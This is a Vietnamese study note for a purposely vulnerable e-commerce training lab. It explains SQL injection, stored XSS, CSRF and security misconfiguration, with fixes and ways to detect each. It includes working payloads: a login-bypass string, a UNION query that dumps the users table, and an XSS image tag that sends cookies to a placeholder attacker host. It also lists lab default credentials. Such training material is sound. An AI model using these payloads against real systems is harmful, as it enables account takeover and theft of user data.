# Khái niệm: OWASP Top 10 & 4 vuln của lab

> OWASP Top 10 = danh sách **10 rủi ro bảo mật web phổ biến nhất** do tổ chức phi lợi nhuận
> OWASP công bố (cập nhật 2021, bản 2025 đã ra). Nhà tuyển dụng hay hỏi vì nó là "ngôn ngữ
> chung" để nói về lỗ hổng web. Lab này cài 4 trong số đó — mỗi vuln 1 file report riêng ở
> `findings/` (Phase 4), file này chỉ giải thích khái niệm từng loại.

## Bảng tổng kết nhanh

| Vuln | OWASP 2021 | CWE | Bản chất 1 câu | FashionHub nằm ở đâu |
|---|---|---|---|---|
| F01 SQL Injection | A03:2021 Injection | CWE-89 | Nhét SQL vào input → query chạy thứ mình muốn | `POST /api/login` (bypass) + `GET /api/products?q=` (UNION dump users) |
| F02 Stored XSS | A03:2021 Injection | CWE-79 | Nhét HTML/JS vào nội dung lưu DB → ai mở trang dính | Review sản phẩm, render bằng `dangerouslySetInnerHTML` |
| F03 CSRF | A01:2021 Broken Access Control | CWE-352 | Trang khác tự gửi request thay user đang đăng nhập | `POST /api/profile/email` — không CSRF token, cookie SameSite=None |
| F04 Security Misconfig + Broken Auth | A05:2021 + A07:2021 | CWE-16, CWE-287, CWE-522… | Cấu hình lỏng: creds mặc định, thiếu headers, lộ lỗi… | Toàn app: không helmet/rate-limit, cookie sai flags, password plaintext |

---

## 1. SQL Injection (F01) — A03:2021 Injection / CWE-89

**Cơ chế:** server nối thẳng input của user vào câu SQL. Input chứa ký tự đặc biệt
(`'`, `--`, `UNION…`) nên "thoát" khỏi chỗ dữ liệu và trở thành **lệnh SQL** do attacker soạn.

```
Query đáng lẽ:   SELECT * FROM users WHERE email = '<input>' AND password = '<input>'
Input độc:       email = admin@fashionhub.dev'--      password = x
Query thật chạy: SELECT * FROM users WHERE email = 'admin@fashionhub.dev'--' AND password = 'x'
                                        ↑ phần còn lại bị COMMENT (--), password bị bỏ qua
→ Đăng nhập admin không cần password đúng

Input độc 2:     q = ' UNION SELECT NULL,email,password,NULL,role,email FROM users--
→ UNION ghép thêm 1 query do attacker viết → response trả về cả bảng users (email + password)
```

**Phân biệt:** `'--` (comment, bỏ phần sau) = bypass login; `UNION SELECT` = đọc dữ liệu bảng khác.
Trước UNION phải **đếm số cột** (`ORDER BY n` tăng dần tới khi lỗi) cho khớp — lab để SELECT đúng
6 cột (D9) để payload dễ viết, đúng cách người thật khai thác.

**Vì sao nguy hiểm:** attacker đọc/ghi/xoá **mọi thứ trong DB**, không giới hạn ở bảng của
tính năng. Đây là vuln "kinh điển" nhất, luôn đứng đầu danh sách kiểm tra.

**Cách sửa (report F01 viết before/after):** parameterized query / prepared statement
(thư viện `pg` của Postgres) — input đi qua tham số, DB xử lý như DỮ LIỆU, không bao giờ
là lệnh:

```javascript
// SAI (vulnerable)
const r = await pool.query(`SELECT * FROM users WHERE email='${email}' AND password='${password}'`)
// ĐÚNG (fixed)
const r = await pool.query('SELECT * FROM users WHERE email=$1 AND password=$2', [email, password])
```

**Phát hiện:** ZAP active scan (gửi payload tự động, thấy "syntax error"/bất thường) + verify
tay bằng Postman (tasks/09). Dấu hiệu tay: input `'` gây 500, `' ORDER BY n--` đếm cột.

---

## 2. Stored XSS (F02) — A03:2021 Injection / CWE-79

**Cơ chế:** input chứa HTML/JS được **lưu vào DB** rồi **render lại dưới dạng HTML** cho
người khác. Browser tưởng đó là code của trang (cùng origin) → chạy với toàn quyền.
(Xem chi tiết `session-cookie-csrf-xss.md`.)

```
Review content lưu:  <img src=x onerror="fetch('http://attacker/c?'+document.cookie)">
Admin mở admin panel → render HTML thô → <img> lỗi → onerror chạy → cookie admin bị gửi đi
```

**Vì sao gọi là "Stored":** payload nằm trong DB, **mỗi lần** ai đó mở trang đều dính —
không cần lừa click như Reflected XSS. Lab cố ý cho đăng review **không cần đăng nhập** (D8)
để bất kỳ ai cũng "gieo" được payload.

**Cách sửa:**
```
1. Render text thuần — React MẶC ĐỊNH escape < > & (bỏ dangerouslySetInnerHTML là hết 90% bài)
2. (Tùy chọn) sanitize đầu vào bằng DOMPurify nếu thật sự cần rich text
3. Lớp phòng thủ thứ 2: CSP header + cookie HttpOnly (giảm impact, không phải fix gốc)
```

**Phát hiện:** ZAP **không tự** đăng nhập + post review được → phải verify TAY
(browser + Postman + Burp). Đây là điểm kể chuyện "scanner không phải viên đạn bạc".

---

## 3. CSRF (F03) — A01:2021 Broken Access Control / CWE-352

**Cơ chế:** browser **tự gửi cookie** trong mọi request (kể cả request do trang KHÁC tạo ra).
Nếu request thay đổi trạng thái (đổi email…) mà chỉ dựa cookie + không có CSRF token →
trang attacker chỉ cần 1 form ẩn tự submit là "mượn tay" nạn nhân thực hiện hành động.

```
(chi tiết cơ chế + điều kiện 4 cái: session-cookie-csrf-xss.md §6)
FashionHub: POST /api/profile/email  {newEmail}  — chỉ cần cookie, không token, cookie None
```

**Vì sao xếp vào A01 Broken Access Control:** về bản chất là server **không phân biệt được**
request do user chủ động gửi hay do trang khác "mượn" session gửi — kiểm soát truy cập
"nhân danh ai" bị hỏng.

**Cách sửa (tầng lớp, từ đủ đến mạnh):**
```
1. CSRF token: server sinh token ngẫu nhiên gắn vào form/header, verify mỗi request
   (trang attacker KHÔNG đọc được token của trang nạn nhân → không giả được)
2. SameSite=Lax/Strict trên cookie session (chặn cookie gửi cross-site)
3. Không dùng GET cho state change; kiểm tra header Origin/Referer
```

**Phát hiện:** tay (mở `poc/csrf-poc.html` xem email đổi) + Burp "Generate CSRF PoC".
ZAP passive scan chỉ gợi ý ("thiếu token") — không tự khai thác được chuỗi login → mở PoC.

---

## 4. Security Misconfiguration + Broken Auth (F04) — A05:2021 + A07:2021

**Bản chất:** không phải 1 lỗi code mà là **nhóm lỗi cấu hình + quản lý danh tính yếu**.
Lab gộp 6 mục con vào 1 report (đủ chi tiết nhưng không loãng):

```
F04-1 Default credentials    admin@fashionhub.dev / admin123 — admin panel không buộc đổi
F04-2 No rate-limit/lockout  POST /api/login thử sai vô hạn → brute-force (Burp Intruder)
F04-3 Verbose error          Lỗi SQL trả nguyên query text + stack trace ra browser
F04-4 Thiếu security headers Không CSP / X-Frame-Options / HSTS (ZAP passive scan tự ghi)
F04-5 Cookie thiếu flags     httpOnly=false · sameSite=None (nền cho F02 + F03)
F04-6 Password plaintext     users.password lưu text thường (SQLi dump ra password thật)
```

**Cách sửa (1 hàng đọc gọn):** `helmet` (headers) · `express-rate-limit` (F04-2) ·
error-handler middleware chỉ trả message gọn (F04-3) · bcrypt/argon2 hash (F04-6) ·
cookie `HttpOnly + SameSite=Lax` (F04-5) · buộc đổi password mặc định / không có admin mặc định (F04-1).

**Phát hiện:** ZAP **passive scan tự ghi alerts** ("Missing security headers", "Cookie without
flags"…) — phần lớn finding này ZAP tìm giúp, tay chỉ xác nhận + chụp bằng chứng.
Đây là finding "dễ nhất để có evidence đẹp" và là nơi học cách **triage** (20+ alerts
→ gộp trùng → 4 findings thật).

---

## 5. Bảng tra nhanh khi ôn

| Câu hỏi | Trả lời |
|---|---|
| OWASP Top 10 là gì? | 10 rủi ro web phổ biến nhất, OWASP công bố — "ngôn ngữ chung" của security web |
| A03 Injection gồm gì? | SQLi, XSS (kiểu injection vào "trình thông dịch" của DB / của browser)… |
| SQLi vs XSS khác gì? | SQLi tấn công DATABASE (input thành lệnh SQL). XSS tấn công BROWSER người dùng khác (input thành HTML/JS) |
| CSRF khác XSS? | CSRF = mượn cookie nạn nhân gửi request (không cần code chạy trong trang). XSS = chạy code trong trang nạn nhân (quyền cao hơn nhiều) |
| Misconfig có "code sai" không? | Không hẳn — là "thiếu cấu hình đúng": headers, rate-limit, error handling, hash, cookie flags |
| Cách sửa chung nhất? | Validate + parameterize input · escape output · CSRF token + SameSite · helmet/rate-limit/error handler · hash password · không default creds |

> Ghi nhớ chuẩn bị cho interview: đọc `findings/` (4 report) + 3 file concepts còn lại +
> bảng ở `docs/guides/decisions.md` — đó là toàn bộ "học liệu" cần thuộc.
